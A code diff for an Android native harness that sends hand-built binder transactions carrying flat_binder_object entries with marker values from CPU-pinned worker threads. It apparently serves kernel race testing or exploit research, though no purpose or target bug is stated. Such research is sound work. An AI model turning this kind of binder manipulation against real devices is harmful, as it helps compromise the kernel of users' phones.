@@ -259,6 +259,31 @@ static int raw_send(int fd, int32_t handle, uint32_t code, uint32_t flags,
     return bwr.write_consumed == sizeof(packet) ? 0 : -2;
 }
 
+
+static int raw_send_obj(int fd, int32_t handle, uint32_t code, uint32_t flags,
+                        const void* data, size_t size,
+                        const binder_size_t* offsets, size_t offsets_size) {
+    struct {
+        uint32_t command;
+        struct binder_transaction_data transaction;
+    } __attribute__((packed)) packet;
+    memset(&packet, 0, sizeof(packet));
+    packet.command = BC_TRANSACTION;
+    packet.transaction.target.handle = (uint32_t)handle;
+    packet.transaction.code = code;
+    packet.transaction.flags = flags;
+    packet.transaction.data_size = size;
+    packet.transaction.offsets_size = offsets_size;
+    packet.transaction.data.ptr.buffer = (binder_uintptr_t)(uintptr_t)data;
+    packet.transaction.data.ptr.offsets = (binder_uintptr_t)(uintptr_t)offsets;
+    struct binder_write_read bwr;
+    memset(&bwr, 0, sizeof(bwr));
+    bwr.write_size = sizeof(packet);
+    bwr.write_buffer = (binder_uintptr_t)(uintptr_t)&packet;
+    if (ioctl(fd, BINDER_WRITE_READ, &bwr) < 0) return -1;
+    return bwr.write_consumed == sizeof(packet) ? 0 : -2;
+}
+
 static int wait_for_child(int fd, uint32_t expected_code) {
     unsigned char buffer[8192];
     for (int round = 0; round < 64; round++) {
@@ -279,6 +304,23 @@ static int wait_for_child(int fd, uint32_t expected_code) {
                 struct binder_transaction_data* tr =
                     reinterpret_cast<struct binder_transaction_data*>(buffer + pos);
                 if (tr->code == expected_code) {
+                    struct {
+                        uint32_t command;
+                        struct binder_transaction_data transaction;
+                    } __attribute__((packed)) reply;
+                    memset(&reply, 0, sizeof(reply));
+                    reply.command = BC_REPLY;
+                    reply.transaction.target = tr->target;
+                    reply.transaction.cookie = tr->cookie;
+                    reply.transaction.code = 0;
+                    reply.transaction.flags = 0;
+                    reply.transaction.data_size = 0;
+                    reply.transaction.offsets_size = 0;
+                    struct binder_write_read rbwr;
+                    memset(&rbwr, 0, sizeof(rbwr));
+                    rbwr.write_size = sizeof(reply);
+                    rbwr.write_buffer = (binder_uintptr_t)(uintptr_t)&reply;
+                    (void)ioctl(fd, BINDER_WRITE_READ, &rbwr);
                     struct { uint32_t command; binder_uintptr_t buffer; } __attribute__((packed)) fp;
                     fp.command = BC_FREE_BUFFER; fp.buffer = tr->data.ptr.buffer;
                     struct binder_write_read fbwr; memset(&fbwr, 0, sizeof(fbwr));
@@ -322,7 +364,19 @@ static void* walker_worker(void* opaque) {
     CPU_SET((unsigned)(index % (int)sysconf(_SC_NPROCESSORS_ONLN)), &set);
     int pin_rc = sched_setaffinity(0, sizeof(set), &set);
     int expected = arg->expected;
-    int send_rc = raw_send(fd, handle, 1, 0, &expected, sizeof(expected));
+    struct {
+        int expected;
+        struct flat_binder_object object;
+    } __attribute__((packed)) payload;
+    memset(&payload, 0, sizeof(payload));
+    payload.expected = expected;
+    payload.object.hdr.type = BINDER_TYPE_BINDER;
+    payload.object.flags = FLAT_BINDER_FLAG_ACCEPTS_FDS;
+    payload.object.binder = (binder_uintptr_t)(0x4242424200000001ULL + index);
+    payload.object.cookie = (binder_uintptr_t)(0x4242424200000002ULL + index);
+    binder_size_t object_offset = (binder_size_t)sizeof(int);
+    int send_rc = raw_send_obj(fd, handle, 1, 0, &payload, sizeof(payload),
+                               &object_offset, sizeof(object_offset));
     int child_rc = wait_for_child(fd, 2);
     __android_log_print(ANDROID_LOG_INFO, TAG, "worker index=%d pin=%d send=%d child=%d", index, pin_rc, send_rc, child_rc);
     if (child_rc == 0) {
